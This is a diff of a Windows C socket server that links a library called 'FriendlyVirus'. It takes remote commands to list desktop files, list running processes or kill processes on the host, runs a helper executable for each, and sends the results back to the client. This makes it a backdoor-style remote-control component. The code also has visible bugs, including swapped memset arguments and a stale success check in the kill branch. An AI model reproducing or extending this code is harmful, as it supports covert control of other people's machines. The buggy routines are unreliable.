@@ -8,6 +8,7 @@
 #pragma comment(lib,"ws2_32.lib")
 #pragma comment(lib,"../debug/FriendlyVirus.lib")
 
+;
 //全局变量，邮槽句柄指针
 HANDLE *hMailslot;
 
@@ -44,6 +45,31 @@ void CombineString(WCHAR** des, WCHAR* src_0, char *src_1, char *src_2, int *siz
 	*desTmp = (WCHAR) '\0';
 }
 
+//函数重载
+void CombineString(WCHAR** des, WCHAR* src_0, char *src_1, int *size)
+{
+	int size_ = 0;
+	*size = lstrlen(src_0) * sizeof(WCHAR) + (2 + strlen(src_1)) * sizeof(WCHAR);
+	WCHAR *src_0_temp = src_0;
+	CHAR *src_1_temp = src_1;
+	*des = (WCHAR*)malloc(*size);
+	memset(*des, *size, '\0');
+	WCHAR *desTmp = *des;
+
+	while (*src_0_temp) {
+		*desTmp = *src_0_temp;
+		(desTmp)++;
+		src_0_temp++;
+	}
+	*desTmp = (WCHAR)' ';
+	(desTmp)++;
+	while (*src_1_temp) {
+		*desTmp = (WCHAR)*src_1_temp;
+		(desTmp)++;
+		src_1_temp++;
+	}
+	*desTmp = (WCHAR) '\0';
+}
 
 void GetTotalBytes(WCHAR** des,int *totalBytes) {
 	*totalBytes = 0;
@@ -90,6 +116,10 @@ DWORD WINAPI ThreadProc(LPVOID lpParam) {
 	WCHAR* totalMessageTmp = NULL;
 	LPWSTR* message = NULL;
 	LPWSTR* messageTmp = NULL;
+	WCHAR* exeNameAndCmdLine = NULL;
+	int cbnsize = 0;
+	char tmpName[100];
+	int bytesSend = 0;
 	WCHAR answerWord[] = L"Recieved Success!";
 	ZeroMemory(&strtinfo, sizeof(strtinfo));
 	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
@@ -114,10 +144,12 @@ DWORD WINAPI ThreadProc(LPVOID lpParam) {
 			printf("线程[%d]接收到数据:%s\n",threadId,recvBuff);
 			
 			if (strcmp(recvBuff, "desktopfile") == 0) {
-				bCreateProcessResult = CreateProcess(NULL,exeName, NULL, NULL, FALSE, 0, 
+				ZeroMemory(tmpName, 100);
+				CopyMemory(tmpName, "desktopfile",11);
+				CombineString(&exeNameAndCmdLine, exeName, tmpName,&cbnsize);
+				bCreateProcessResult = CreateProcess(NULL,exeNameAndCmdLine, NULL, NULL, FALSE, 0, 
 					NULL, NULL, &strtinfo,&processInformation);
 				JudgeSuccessOrNot(bCreateProcessResult);
-				Sleep(500);
 				message = GetMessageFromMailslot(*hMailslot); 
 				messageTmp = message;
 				if (*messageTmp) {
@@ -130,7 +162,6 @@ DWORD WINAPI ThreadProc(LPVOID lpParam) {
 					WCHAR slipChar = '\n';
 					while (*messageTmp) {
 						while (**messageTmp) {
-							//CopyMemory((void*)*totalMessageTmp, (void**)**messageTmp, sizeof(WCHAR));
 							*totalMessageTmp = **messageTmp;
 							totalMessageTmp++;
 							(*messageTmp)++;
@@ -139,28 +170,83 @@ DWORD WINAPI ThreadProc(LPVOID lpParam) {
 						totalMessageTmp++;
 						messageTmp++;
 					}
+					*totalMessageTmp = '\0';
 				}
+				bytesSend = send(answerSocket, (CHAR*)totalMessage, (lstrlen(totalMessage) + 1) * sizeof(WCHAR), 0);
+				
 				//发送数据回客户端
-				send(answerSocket, (char*)totalMessage, (lstrlen(totalMessage)+1)*sizeof(WCHAR),0);
+				if( bytesSend == SOCKET_ERROR) {
+					printf("数据发送失败!%d\n",WSAGetLastError());
+					WCHAR errorMsg[] = L"数据发送失败!";
+					if (send(answerSocket, (char*)errorMsg, (lstrlen(errorMsg) + 1) * 2, 0) == SOCKET_ERROR) {
+						printf("xxx\n");
+					}
+				}
+				else {
+					printf("数据发送成功,共发送%d字节数据!\n",bytesSend);
+				}
+				
 				HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, message);
 				HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, totalMessage);
 				CloseHandle(processInformation.hThread);
 				CloseHandle(processInformation.hProcess);
 			}
-			if (strcmp(recvBuff, "kill") == 0) {
+			else if (strcmp(recvBuff, "kill") == 0) {
 				printf("继续接受指令\n");
 				Sleep(500);
 				recv(answerSocket, recvBuff, 512, 0);
 				//构造命令行，使目标函数执行相关操作
-				WCHAR* exeNameAndCmdLine=NULL;
-				char src1[] = "kill";
-				int cbnsize = 0;
-				CombineString(&exeNameAndCmdLine, exeName, src1, recvBuff, &cbnsize);
+				ZeroMemory(tmpName, 100);
+				CopyMemory(tmpName, "kill", 4);
+				CombineString(&exeNameAndCmdLine, exeName, tmpName, recvBuff, &cbnsize);
 				CreateProcess(NULL, exeNameAndCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &strtinfo, &processInformation);
-				send(answerSocket, "Instruction code recieved!", 27, 0);
-				/*if (strcmp(recvBuff," ") == 0) {
-					send(answerSocket, "InstructionNotCorrect!", 23, 0);
-				}*/
+				JudgeSuccessOrNot(bCreateProcessResult);
+				message = GetMessageFromMailslot(*hMailslot);
+				messageTmp = message;
+				if (*messageTmp) {
+					int totalBytes = 0;
+					GetTotalBytes(messageTmp, &totalBytes);
+					if (totalBytes != 0) {
+						totalMessage = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalBytes + totalBytes / sizeof(WCHAR));
+						totalMessageTmp = totalMessage;
+					}
+					WCHAR slipChar = '\n';
+					while (*messageTmp) {
+						while (**messageTmp) {
+							*totalMessageTmp = **messageTmp;
+							totalMessageTmp++;
+							(*messageTmp)++;
+						}
+						*totalMessageTmp = slipChar;
+						totalMessageTmp++;
+						messageTmp++;
+					}
+					*totalMessageTmp = '\0';
+				}
+				bytesSend = send(answerSocket, (CHAR*)totalMessage, (lstrlen(totalMessage) + 1) * sizeof(WCHAR), 0);
+
+				//发送数据回客户端
+				if (bytesSend == SOCKET_ERROR) {
+					printf("数据发送失败!%d\n", WSAGetLastError());
+					WCHAR errorMsg[] = L"数据发送失败!";
+					if (send(answerSocket, (char*)errorMsg, (lstrlen(errorMsg) + 1) * 2, 0) == SOCKET_ERROR) {
+						printf("xxx\n");
+					}
+				}
+				else {
+					printf("数据发送成功,共发送%d字节数据!\n", bytesSend);
+				}
+
+				HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, message);
+				HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, totalMessage);
+				CloseHandle(processInformation.hThread);
+				CloseHandle(processInformation.hProcess);
+			}
+			else if (strcmp(recvBuff, "processes") == 0) {
+				ZeroMemory(tmpName, 100);
+				CopyMemory(tmpName, "processes", 10);
+				CombineString(&exeNameAndCmdLine, exeName, tmpName, recvBuff, &cbnsize);
+				CreateProcess(NULL, exeNameAndCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &strtinfo, &processInformation);
 			}
 			else {
 				send(answerSocket,(char*)answerWord, (lstrlen(answerWord) + 1)*sizeof(WCHAR), 0);
